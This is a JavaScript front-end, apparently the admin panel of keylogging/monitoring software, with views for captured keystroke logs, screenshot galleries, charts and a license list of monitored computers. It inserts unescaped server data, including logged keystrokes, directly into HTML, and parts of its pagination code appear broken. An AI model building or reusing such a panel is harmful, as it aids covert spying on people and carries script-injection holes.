var __core = function (r){

    var elem,
        tpls,
        nav_tpls;
    $.fn.load = function(){
        elem = $(this).parent();
        var data = elem.data().link;
        data.cmd = "get_node";
        r.get(data, 'get_node', cbk, errorHandle);
    };

    var callbacks = {
        'home'  :   function(data){
            if (typeof data.chart != "undefined")
                $.plot($("#default"), data.chart, { series: { pie: { show: true } } });
        },
        'other' :   function(data){
            var c = data.charts.length;
            for (var i=0; i<c; i++){
                r.get({cmd: 'get_chart', type: data.charts[i], user: data.user}, '', function(jdata){
                    if(typeof jdata.el != "undefined" && jdata.chart != "undefined"){
                        $.plot($("#gr_"+jdata.el), jdata.chart, { series: { pie: { show: true } } });

                        $("#inf_"+jdata.el).data({link:{key: jdata.el+'_info', user:data.user}}).children().click(function(){
                            $(this).load();
                        });
                    }
                }, errorHandle);
            }
        },
        'graph_info'    :   function(data){
            if (typeof data.charts == "undefined")
                return;

            var c = data.charts.length;
            var html = '';
            for (var i=0; i<c; i++){
                if (typeof data.charts[i].key != "undefined" && typeof data.charts[i].value != "undefined" && typeof data.charts[i].desc != "undefined")
                    html += '<tr><td>'+data.charts[i].key+'</td><td>'+data.charts[i].value+'</td><td>'+data.charts[i].desc+'</td></tr>';


            }
            $('#chart_info tbody').append(html);
        },
        'send'  :   function(data){
            $('#cont form').submit(function(e){
                var form = { cmd : "send", type : data.type };
                $(this).find('input, textarea').each(function(i, elem){
                    form[$(elem).attr('name')] = $(elem).val();
                });

                r.post(form, '', function(data){
                    $("#msg").addClass('alert-success').removeClass('alert-error').text(data.message).show();
                }, function(data){
                    errorHandle(data, $("#msg"));
                });

                return false;
            });
        },
        'screenlog' : function(data){
            var html = '';
            $.each(data.screens, function(i, cur){
                html += '<li><a href="'+cur+'" rel="gallery" class="pirobox_gall" title=""><img style="width: 200px;" src="'+cur+'"  /></a></li>';
            });

            $('#screens').html('<ul>'+html+'</ul>');
            $(document).ready(function() {
                $().piroBox_ext({
                    piro_speed : 700,
                    bg_alpha : 0.5,
                    piro_scroll : true
                });
            });
        },
        'keystrokelog'    :   function(data){
            if (typeof data.table == "undefined" || typeof data.user == "undefined")
                return;

            var t = $("#table");

            var load = function(data, container){
                var c = data.length;
                var html = '';
                for (var i=0; i<c; i++){
                    if (typeof data[i].date != "undefined" && typeof data[i].icon != "undefined" && typeof data[i].app != "undefined" && typeof data[i].value != "undefined")
                        html += '<tr><td>'+data[i].date+'</td><td><img src="'+data[i].icon+'" title="icon" alt="icon"/></td><td>'+data[i].app+'</td><td>'+data[i].value+'</td></tr>';
                }
                container.html(html);
            };
            
            load(data.table, $('tbody', t));

            var table = new __lister();
            table.init(r, {'user': data.user, 'cmd':'get_keystrokelog'}, function(data){
                load(data.table, $('tbody', t));
            },errorHandle);

            t.data('lister', table);

            $('#next').click(function(e){
                e.stopPropagation();
                table.next();
                return false;
            });

            $('#prev').click(function(e){
                e.stopPropagation();
                table.prev();
                return false;
            });
        },
        'settings'  :   function(data){
            if (typeof data.settings == "undefined")
                return;
        },
        'license'   : function(data){
            $('#license-dr').on('click', function(e){
                var req = {cmd: 'send_license'};
                req.un = $('#license-un').val();
                req.e = $('#license-e').val();
                req.s = $('#license-s').val();
                r.post(req, '', function(jdata){
                    if (typeof jdata.licensed != "undefined" && jdata.licensed){
                        $('#license-un, #license-e, #license-s').val('');
                        callbacks['_get_license']();
                    }
                    else {
                        alert(jdata.msg);
                    }
                }, errorHandle);
            });

            callbacks['_get_license']();
        },
        '_get_license'   :   function(data){
            r.get({cmd: 'get_license'}, '', function(jdata){
                if (jdata.licensed == "undefined"){
                    return;
                }

                $('#license-t').text(jdata.license.type);
                $('#license-vt').text(jdata.license.validtill);
                $('#license-cc').text(jdata.license.compcount);
                var c = jdata.license.complist.length;
                var html = '';
                for (var i=0; i<c; i++){
                    html+= '<li>'+jdata.license.complist[i]+'</li>';
                }
                $('#license-cl').html('<ul>' + html + '</ul>');

            }, errorHandle);
        }
    };

    var build = function(data, root){
        var c = data.length,
            append = '';
        root.html('');
        for (var i=0; i<c; i++){
            if ((typeof data[i].name != "undefined" || typeof data[i].key != "undefined") && typeof data[i].link != "undefined")
                $('<li><a href="#">'+getNavName(data[i])+'</a></li>').data({link: data[i].link}).children().click(function(e){
                    e.stopPropagation();
                    $(this).load();
                    return false;
                }).parent().appendTo(root);
        }
    };

    var cbk = function (data) {
        if (typeof data.tree != "undefined" && data.tree.length){
            var newul = $("> ul", elem);
            if (!newul.length){
                newul = $("<ul  class=\"nav nav-list\" />").appendTo(elem);
            }
            else {
                newul.empty();
            }

            build(data.tree, newul);
        }

        if (typeof data.template != "undefined" && data.template!=''){
            $('#tree li').removeClass('active');
            elem.addClass('active');
            var t = $(data.template, tpls);
            if (t.length==1){
                t = t.text();
                if (typeof data.asserts != "undefined" && data.asserts.length!=0){
                    var c = data.asserts.length;
                    for (var i=0; i<c; i++){
                        if (typeof data.asserts[i].key != "undefined" && typeof data.asserts[i].value != "undefined")
                            t = t.replace('{'+data.asserts[i].key+'}', data.asserts[i].value);
                    }
                }
                $('#cont').html(t);
            }
        }

        if (typeof data.cbk != "undefined" && data.cbk != '' && typeof callbacks[data.cbk] == "function"){
            callbacks[data.cbk](data);
        }

    };

    var loadTpl = function(force){
        force = force || 0;
        var cbk = function(){};
        if (typeof force == "function"){
            cbk = force;
            force = true;
        }
        if (typeof tpls=="undefined" || force)
            $.get('tpl/templates.xml', {}, function(xml){
                if ($('root > templates',xml).length==1)
                    tpls = $('root > templates',xml);

                if ($('root > tree',xml).length==1)
                    nav_tpls = $('root > tree',xml);
                cbk();
            },'xml');
    };

    var getNavName = function(link){
        if (typeof link.name != "undefined"){
            return link.name;
        }
        else if (typeof link.key != "undefined"){
            return $(link.key,nav_tpls).text();
        }
        return '';
    };
    
    var errorHandle = function (err, elem) {
        err = err.error;
        elem = elem || null;
        switch (err.type){
            case 'NO_AUTH':
                $("#auth-form").show();
                if (!$('#auth-password:visible').length){
                    $('#auth-form input').toggle();
                }
                $("#content").hide();
                if (err.message.length>0){
                    $("#auth-alert").text(err.message).show();
                }
                else {
                    $("#auth-alert").hide();
                }
                break;
            case 'NO_REG':
                $("#auth-form").show();
                if (!$('#reg-password:visible').length){
                    $('#auth-form input').toggle();
                }
                $("#content").hide();
                if (err.message.length>0){
                    $("#auth-alert").text(err.message).show();
                }
                else {
                    $("#auth-alert").hide();
                }
                break;
            case 'LOCAL':
                $(elem).removeClass('alert-success').addClass('alert-error').text(err.message).show();
                break;
        }
    };

    var init = function() {
        $("#tree").text('Loading...');

        $("#auth-form").unbind('submit').submit(function(e){
            e.stopPropagation();
            var data = { cmd: 'auth' };

            if ($("#auth-password:visible").length){
                data.pass = $("#auth-password").val();
            }
            else {
                data.pass = $("#reg-password").val();
            }

            r.post(data, 'auth', init, errorHandle);

            return false;
        });

        $("#exit").unbind('click').click(function(e){
            e.stopPropagation();
            r.post({ cmd: 'unauth' }, 'unauth', init, errorHandle);
        });

        loadTpl(function(){
            r.get({cmd: 'get_node', key: 'root'}, 'root', function(data){
                $("#auth-form").hide();
                $("#content").show();
                build(data.tree, $("#tree"));
                $("#tree li").eq(0).addClass('active');
            }, errorHandle);
        });
    };

    return {
        init : init
    };
};

var __request = function(){

    var request = function (type, data, validator, success, fail, inv) {
        invalid = inv || invalid;
        $.ajax({
            type: type,
            url: "json/",
            dataType: "json",
            data: {data: JSON.stringify(data)},
            success: function(json) {
                if (typeof json != "undefined"){
                    if (typeof validators[validator] != "undefined"){
                        if (validators[validator](json.data)){
                            if (json.result){
                                console.log('[r]: success called');
                                success(json.data);
                            }
                            else {
                                console.log('[r]: fail called');
                                fail(json.data);
                            }
                        }
                        else {
                            invalid(validator);
                        }
                    }
                    else {
                        if (json.result){
                            console.log('[r]: success called');
                            success(json.data);
                        }
                        else {
                            console.log('[r]: fail called');
                            fail(json.data);
                        }
                    }
                }
                else {
                    invalid(validator);
                }
            }
        });
    };

    var invalid = function(validator){
        console.log('['+validator+']: invalid');
    };

    var get = function (data, validator, success, fail, inv) {
        request('get', data, validator, success, fail, inv);
    };

    var post = function (data, validator, success, fail, inv) {
        request('post', data, validator, success, fail, inv);
    };

    var validators = {
        root : function (data){
            var $return = true;
            if (typeof data.error == "undefined"){
                if (typeof data.tree == "undefined"){
                    $return = false
                }
                else {
                    $return = validators._tree(data.tree);
                }
            }
            else {
                $return = validators._error(data);
            }

            return $return;
        },
        get_node : function (data){
            var $return = true;
            if (typeof data.error == "undefined"){
                if (typeof data.tree != "undefined" && data.tree.length>0){
                    $return = validators._tree(data.tree);
                }

                if ($return && typeof data.asserts != "undefined" && data.asserts.length>0){
                    $return = validators._asserts(data.asserts)
                }
            }
            else {
                $return = validators._error(data);
            }

            return $return;
        },
        _error : function (data) {
            var $return = true;

            if (typeof data.error == "undefined"){
                $return = false;
            }

            return $return;
        },
        _tree : function (tree) {
            var c = tree.length,
                $return = true;

            if (c==0) {
                $return = false;
            }
            for (var i = 0; i < c; i++){
                if (typeof tree[i].link == "undefined"
                    || typeof tree[i].link.key == "undefined") {
                    $return = false;
                }

                if (typeof tree[i].name == "undefined"
                    && typeof tree[i].key == "undefined") {
                    $return = false;
                }
            }

            return $return;
        },
        _asserts : function (asserts) {
            var $return = true,
                c = asserts.length;
            if (c == 0){
                $return = false;
            }

            for (var i = 0; i < c; i++) {
                if (typeof asserts[i].key == "undefined" || typeof asserts[i].value == "undefined") $return = false;
            }

            return $return;
        }
    };

    return {get: get, post: post};
};

__lister = function(){

    var options;
    var nextE = $('#next');
    var prevE = $('#prev');

    var init = function(option){
        var defaults = {k: {}, callback: function(){}, ecallback: function(){}, page: 0};
        options = $.extend(defaults, option);
    };

    var next = function(data){
        data = data || {};
        options.page++;
        data.p = options.page;
        change(data);
    };

    var prev = function(data){
        data = data || {};
        options.page--;
        data.p = options.page;
        change(data);
    };

    var change = function(data){
        data = $.extend(options.k, data);
        r.get(data, '', function(data){
            options.callback();
        }, options.ecallback);
    };

    return {init: init, next: next, prev: prev};
};